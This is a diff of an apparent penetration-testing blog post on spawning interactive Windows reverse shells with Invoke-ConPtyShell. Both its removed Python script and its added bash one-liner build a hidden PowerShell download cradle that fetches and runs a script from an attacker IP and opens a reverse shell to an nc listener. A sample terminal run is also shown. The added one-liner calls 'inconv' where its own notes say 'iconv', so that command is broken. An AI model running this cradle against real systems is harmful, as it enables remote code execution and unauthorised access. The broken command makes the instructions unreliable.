@@ -2,8 +2,10 @@
 layout: post
 title: "When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell"
 date: 2025-09-09
+description: Bringing stability to rather unstable Windows shells.
 tags:
   - windows
+  - powershell
 ---
 
 Picture this. You're in a good workflow on a Windows target, you even added line editing and command history with `rlwrap`. Then it happens, you accidentally start a program in the foreground... Instinctively, you press `Ctrl + C` in your `nc` Windows shell, killing your shell access along with the program. Not ideal, and very frustrating.
@@ -58,27 +60,30 @@ Before preceding any further, take note of your attack machine's terminal size w
 52 236
 ```
 
-Attempting to use `echo` and piping the output to `base64` on Linux does not result in a properly encoded command. `echo` outputs text in `UTF-8` encoding by default, whereas PowerShell is expecting `UTF-16LE` (little endian). This is where the following Python script comes into play.
+Now we can use this slick one-liner on Kali to convert a PowerShell command into the correct encoding format for Windows.
 
-```python
-#!/usr/bin/python3
-import base64
-payload = 'IEX(New-Object System.Net.WebClient).DownloadString("http://<ATTACK-IP>/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell <ATTACK-IP> <ATTACK-PORT> -Rows <ROWS> -Cols <COLS>'
-cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-print("\033[1;37m[*] Encoded command: \033[1;00m\033[1;33m" + cmd + "\033[00m")
+```bash
+echo -n 'IEX(New-Object System.Net.WebClient).DownloadString("http://<ATTACK-IP>/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell <ATTACK-IP> <ATTACK-PORT> -Rows <ROWS> -Cols <COLS>' | inconv -t UTF16LE | base64 -w 0
 ```
 
-- `<ATTACK-IP>`: Attack machine's IP address.
-- `<ATTACK-PORT>`: Attack machine's `nc` reverse shell listener port.
-- `<ROWS>`: Number of terminal rows.
-- `<COLS>`: Number of terminal columns.
+> [!Example] Arguments & Flags
+> - **echo**
+> 	- `-n`: Specifies no newline character to be appended to the string
+> - **iconv**
+> 	- `-t, --to-code`: The encoding to be converted to
+> - **base64**
+> 	- `-w, --wrap=`: Wrap encoded lines after # of columns. 0 disables line wrapping
+> - `<ATTACK-IP>`: Attack machine's IP address.
+> - `<ATTACK-PORT>`: Attack machine's nc reverse shell listener port.
+> - `<ROWS>`: Number of terminal rows.
+> - `<COLS>`: Number of terminal columns.
 
-Once you've entered all IP, port, and terminal information, execute the Python script using `python3 conpty.py` to output the encoded PowerShell command.
+Once you've entered all IP, port, and terminal information, execute the one-liner on Kali to print the encoded PowerShell command.
 
 ```
 ┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
-└─$ python3 conpty.py          
-[*] Encoded command: powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
+└─$ echo -n 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.X.X/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell 192.168.X.X 8443 -Rows 52 -Cols 236' | inconv -t UTF16LE | base64 -w 0
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
 ```
 
 # Execution
